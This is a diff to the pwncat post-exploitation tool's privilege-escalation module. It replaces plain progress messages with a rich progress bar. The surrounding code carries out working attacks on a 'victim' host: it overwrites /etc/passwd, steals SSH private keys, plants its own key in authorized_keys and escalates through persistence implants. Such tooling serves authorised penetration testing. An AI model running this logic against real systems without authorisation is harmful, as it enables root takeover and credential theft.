@@ -5,7 +5,7 @@ import ipaddress
 import os
 import pkgutil
 import time
-from typing import List, Tuple, Optional, Any
+from typing import List, Tuple, Optional, Any, Generator
 
 from colorama import Fore
 from prompt_toolkit.shortcuts import confirm
@@ -13,6 +13,7 @@ from rich.progress import Progress, BarColumn
 
 import pwncat
 from pwncat import util
+from pwncat.util import console
 from pwncat.enumerate.private_key import PrivateKeyFact
 from pwncat.file import RemoteBinaryPipe
 from pwncat.gtfobins import Capability
@@ -286,7 +287,7 @@ class Finder:
         raise PrivescError(f"no route to {target_user} found")
 
     def escalate_single(
-        self, techniques: List["Technique"], shlvl: str
+        self, techniques: List["Technique"], shlvl: str, progress: Progress, task,
     ) -> Tuple[Optional["Technique"], str]:
         """ Use the given list of techniques to escalate to the user. All techniques
         should be for the same user. This method will attempt a variety of privesc
@@ -309,7 +310,7 @@ class Finder:
         for technique in techniques:
             if Capability.SHELL in technique.capabilities:
                 try:
-                    util.progress(f"attempting {technique}")
+                    progress.update(task, step=f"attempting {technique}")
 
                     # Attempt our basic, known technique
                     exit_script = technique.method.execute(technique)
@@ -326,7 +327,7 @@ class Finder:
                         technique.user == pwncat.victim.config["backdoor_user"]
                         and current == "root"
                     ):
-                        util.progress(f"{technique} succeeded!")
+                        progress.update(task, step=f"{technique} succeeded!")
                         pwncat.victim.flush_output()
                         return technique, exit_script
 
@@ -367,6 +368,10 @@ class Finder:
                 # Grab the first writer
                 writer = writers[0]
 
+                progress.update(
+                    task, step="attempting [cyan]/etc/passwd[/cyan] overwrite"
+                )
+
                 # Read /etc/passwd
                 with pwncat.victim.open("/etc/passwd", "r") as filp:
                     lines = filp.readlines()
@@ -385,11 +390,18 @@ class Finder:
                 # Maybe help?
                 pwncat.victim.run("echo")
 
+                progress.update(task, step="reloading users")
+
                 # Check that it succeeded
                 users = pwncat.victim.reload_users()
 
                 # Check if the new passwd file contained the file
                 if user in users:
+                    progress.update(
+                        task,
+                        step="[cyan]/etc/passwd[/cyan] overwrite [green]succeeded![/green]",
+                    )
+
                     # Log our tamper of this file
                     pwncat.victim.tamper.modified_file(
                         "/etc/passwd", added_lines=lines[-1:]
@@ -412,10 +424,15 @@ class Finder:
                     pwncat.victim.flush_output()
 
                     return writer, "exit"
+                else:
+                    progress.update(
+                        task,
+                        step="[cyan]/etc/passwd[/cyan] overwrite [red]failed[/red]",
+                    )
 
         sshd_running = False
         for fact in pwncat.victim.enumerate.iter("system.service"):
-            util.progress("enumerating services: {fact.data}")
+            progress.update(task, step="enumerating remote services")
             if "sshd" in fact.data.name and fact.data.state == "running":
                 sshd_running = True
 
@@ -432,9 +449,9 @@ class Finder:
             # We have an SSHD and we have a file read and a file write
             # technique. We can attempt to leverage this to use SSH to ourselves
             # and gain access as this user.
-            util.progress(
-                f"found {Fore.RED}sshd{Fore.RESET} listening at "
-                f"{Fore.CYAN}{sshd_address}:22{Fore.RESET}"
+            progress.update(
+                task,
+                step=f"[red]sshd[/red] is listening at [cyan]{sshd_address}:22[/cyan]",
             )
 
             authkeys_path = ".ssh/authorized_keys"
@@ -458,8 +475,8 @@ class Finder:
 
                 authkeys_path = os.path.join(home, authkeys_path)
 
-            util.progress(
-                f"found authorized keys at {Fore.CYAN}{authkeys_path}{Fore.RESET}"
+            progress.update(
+                task, step=f"authorized keys at [cyan]{authkeys_path}[/cyan]"
             )
 
             authkeys = []
@@ -494,18 +511,21 @@ class Finder:
                 for pubkey_path in keys:
                     if pubkey_path == "":
                         continue
-                    util.progress(
-                        f"checking if {Fore.CYAN}{pubkey_path}{Fore.RESET} "
-                        "is an authorized key"
+                    progress.update(
+                        task,
+                        step=f"checking [cyan]{pubkey_path}[/cyan] against authorized_keys",
                     )
                     # Read the public key
                     with reader.method.read_file(pubkey_path, reader) as filp:
                         pubkey = filp.read().strip().decode("utf-8")
                     # Check if it matches
                     if pubkey in authkeys:
-                        util.progress(
-                            f"{Fore.GREEN}{os.path.basename(pubkey_path)}{Fore.RESET} "
-                            f"is in {Fore.GREEN}{reader.user}{Fore.RESET} authorized keys"
+                        progress.update(
+                            task,
+                            step=(
+                                f"[green]{os.path.basename(pubkey_path)}[/green] "
+                                f"is an authorized key"
+                            ),
                         )
                         # remove the ".pub" to find the private key
                         privkey_path = pubkey_path.replace(".pub", "")
@@ -514,15 +534,16 @@ class Finder:
                             b"no such file"
                             in pwncat.victim.run(f"file {privkey_path}").lower()
                         ):
-                            util.progress(
-                                f"{Fore.CYAN}{os.path.basename(pubkey_path)}{Fore.RESET} "
-                                f"has no private key"
+                            progress.update(
+                                task,
+                                step=(
+                                    f"[cyan]{os.path.basename(pubkey_path)}[/cyan] "
+                                    "has no private key"
+                                ),
                             )
                             continue
 
-                        util.progress(
-                            f"download private key from {Fore.CYAN}{privkey_path}{Fore.RESET}"
-                        )
+                        progress.update(task, step=f"downloading private key")
                         with reader.method.read_file(privkey_path, reader) as filp:
                             privkey = filp.read().strip().decode("utf-8")
 
@@ -537,6 +558,7 @@ class Finder:
                                 pwncat.victim.users[reader.user].id,
                                 privkey_path,
                                 privkey,
+                                encrypted=False,
                             ),
                             "pwncat.privesc.Finder",
                         )
@@ -548,6 +570,7 @@ class Finder:
                     privkey_path = None
                     privkey = None
             elif writers:
+                # TODO this needs to be updated to work in the middle of a rich progress
                 util.warn(
                     "no readers found for {Fore.GREEN}{techniques[0].user}{Fore.RESET}"
                 )
@@ -580,6 +603,8 @@ class Finder:
                 # Add our public key to the authkeys
                 authkeys.append(pubkey)
 
+                progress.update(task, step="adding our public key to authorized keys")
+
                 # Write the file
                 writer.method.write_file(
                     authkeys_path, ("\n".join(authkeys) + "\n").encode("utf-8"), writer
@@ -600,6 +625,8 @@ class Finder:
             # SSH private keys are annoying and **NEED** a newline
             privkey = privkey.strip() + "\n"
 
+            progress.update(task, step="writing private key to temp file")
+
             with pwncat.victim.tempfile("w", length=len(privkey)) as dst:
                 # Write the file with a nice progress bar
                 dst.write(privkey)
@@ -615,9 +642,9 @@ class Finder:
             pwncat.victim.run(f"chmod 600 {privkey_path}")
 
             # Run ssh as the given user with our new private key
-            util.progress(
-                f"attempting {Fore.RED}ssh{Fore.RESET} to "
-                f"localhost as {Fore.GREEN}{techniques[0].user}{Fore.RESET}"
+            progress.update(
+                task,
+                step=f"attempting local [red]ssh[/red] as [green]{techniques[0].user}[/green]",
             )
             ssh = pwncat.victim.which("ssh")
 
@@ -645,10 +672,36 @@ class Finder:
         target_user: str = None,
         exclude: Optional[List[str]] = None,
         depth: int = None,
+    ):
+        """ Search for and leverage privilege escalation techniques. This is a wrapper
+        method which generates a transient progress bar for the search. The actual
+        escalate logic happens in _escalate. """
+
+        with Progress(
+            "[cyan]{task.fields[from_user]}[/cyan]",
+            "→",
+            "[yellow]{task.fields[to_user]}[/yellow]",
+            "•",
+            "{task.fields[status]}",
+            "•",
+            "{task.fields[step]}",
+            console=console,
+            auto_refresh=True,
+            transient=True,
+            refresh_per_second=1000,
+        ) as progress:
+            return self._escalate(progress, target_user, exclude, depth)
+
+    def _escalate(
+        self,
+        progress: Progress,
+        target_user: str = None,
+        exclude: Optional[List[str]] = None,
+        depth: int = None,
         chain: List["Technique"] = None,
         starting_user=None,
     ) -> List[Tuple["Technique", str]]:
-        """ Search for a technique chain which will gain access as the given 
+        """ Search for a technique chain which will gain access as the given
         user. """
 
         if chain is None:
@@ -659,6 +712,16 @@ class Finder:
 
         if target_user is None:
             target_user = "root"
+
+        # Add a new task to this privesc progress
+        task = progress.add_task(
+            "description",
+            from_user=pwncat.victim.whoami(),
+            to_user=target_user,
+            status="persistence",
+            step="",
+            total=40,
+        )
 
         current_user = pwncat.victim.current_user
         if (
@@ -677,14 +740,13 @@ class Finder:
         # Capture current shell level
         shlvl = pwncat.victim.getenv("SHLVL")
 
+        installed = list(pwncat.victim.persist.installed)
+
         # Check if we have a persistence method for this user
-        util.progress(f"checking local persistence implants")
-        for user, persist in pwncat.victim.persist.installed:
+        for user, persist in installed:
             if not persist.local or (user != target_user and user is not None):
                 continue
-            util.progress(
-                f"checking local persistence implants: {persist.format(target_user)}"
-            )
+            progress.update(task, step=str(persist))
             # Attempt to escalate with the local persistence method
             if persist.escalate(target_user):
 
@@ -701,17 +763,22 @@ class Finder:
                 chain.append((f"persistence - {persist.format(target_user)}", "exit"))
                 return chain
 
+        # We update the status to enumerating and move the progress forward
+        # but also stop the task to show the "pulsating" bar. This is because
+        # we don't have a way of known how many things we will enumerate.
+        progress.update(task, status="enumerating", step="initializing")
+
         # Enumerate escalation options for this user
         techniques = {}
         for method in self.methods:
             if method.id in exclude:
                 continue
             try:
-                util.progress(f"evaluating {method} method")
                 found_techniques = method.enumerate(
                     Capability.SHELL | Capability.WRITE | Capability.READ
                 )
                 for tech in found_techniques:
+                    progress.update(task, step=str(tech))
                     if tech.user not in techniques:
                         techniques[tech.user] = []
                     techniques[tech.user].append(tech)
@@ -720,9 +787,12 @@ class Finder:
 
         # Try to escalate directly to the target if possible
         if target_user in techniques:
+            progress.update(
+                task, status="escalating", step="[yellow]direct escalation[/yellow]"
+            )
             try:
                 tech, exit_command = self.escalate_single(
-                    techniques[target_user], shlvl
+                    techniques[target_user], shlvl, progress, task
                 )
                 pwncat.victim.reset(hard=False)
                 pwncat.victim.update_user()
@@ -732,13 +802,11 @@ class Finder:
                 pass
 
         # Try to use persistence as other users
-        util.progress(f"checking local persistence implants")
-        for user, persist in pwncat.victim.persist.installed:
+        progress.update(task, status="persistence", step="initializing")
+        for user, persist in installed:
             if self.in_chain(user, chain):
                 continue
-            util.progress(
-                f"checking local persistence implants: {persist.format(user)}"
-            )
+            progress.update(task, step=persist.format(user))
             if persist.escalate(user):
 
                 # Ensure history and prompt are correct
@@ -753,7 +821,9 @@ class Finder:
                 chain.append((f"persistence - {persist.format(user)}", "exit"))
 
                 try:
-                    return self.escalate(target_user, depth, chain, starting_user)
+                    return self._escalate(
+                        progress, target_user, exclude, depth, chain, starting_user
+                    )
                 except PrivescError:
                     chain.pop()
                     pwncat.victim.run("exit", wait=False)
@@ -761,6 +831,8 @@ class Finder:
                 # Don't retry later
                 if user in techniques:
                     del techniques[user]
+
+        progress.update(task, status="recursing")
 
         # We can't escalate directly to the target. Instead, try recursively
         # against other users.
@@ -770,14 +842,21 @@ class Finder:
             if self.in_chain(user, chain):
                 continue
             try:
-                tech, exit_command = self.escalate_single(techs, shlvl)
+                progress.update(task, step=f"escalating to [green]{user}[/green]")
+                tech, exit_command = self.escalate_single(techs, shlvl, progress, task)
+
                 chain.append((tech, exit_command))
                 pwncat.victim.reset(hard=False)
                 pwncat.victim.update_user()
             except PrivescError:
                 continue
             try:
-                return self.escalate(target_user, exclude, depth, chain, starting_user)
+                progress.update(
+                    task, step=f"success, recursing as [green]{user}[/green]"
+                )
+                return self._escalate(
+                    progress, target_user, exclude, depth, chain, starting_user
+                )
             except PrivescError:
                 tech, exit_command = chain[-1]
                 pwncat.victim.run(exit_command, wait=False)
@@ -827,15 +906,17 @@ class Technique:
     capabilities: Capability
     """ The GTFOBins capabilities this technique provides. """
 
+    def get_cap_name(self):
+        return {
+            Capability.READ: "file read",
+            Capability.WRITE: "file write",
+            Capability.SHELL: "shell",
+        }[self.capabilities]
+
     def __str__(self):
-        cap_names = {
-            "READ": "file read",
-            "WRITE": "file write",
-            "SHELL": "shell",
-        }
         return (
-            f"{Fore.MAGENTA}{cap_names.get(self.capabilities.name, 'unknown')}{Fore.RESET} "
-            f"as {Fore.GREEN}{self.user}{Fore.RESET} via {self.method.get_name(self)}"
+            f"[magenta]{self.get_cap_name()}[/magenta] "
+            f"as [green]{self.user}[/green] via {self.method.get_name(self)}"
         )
 
 
@@ -867,7 +948,9 @@ class BaseMethod:
             if pwncat.victim.which(binary) is None:
                 raise PrivescError(f"required remote binary not found: {binary}")
 
-    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
+    def enumerate(
+        self, capability: int = Capability.ALL
+    ) -> Generator[Technique, None, None]:
         """
         Enumerate all possible techniques known and possible on the remote host for
         this method. This should only enumerate techniques with overlapping capabilities
@@ -925,7 +1008,10 @@ class BaseMethod:
         :param tech: a technique applicable to this object
         :return: a formatted string
         """
-        return str(self)
+        return f"[red]{self.name}[/red]"
 
     def __str__(self):
         return f"{Fore.RED}{self.name}{Fore.RESET}"
+
+    def __rich_console__(self, console, options):
+        yield f"[red]{self.name}[/red]"
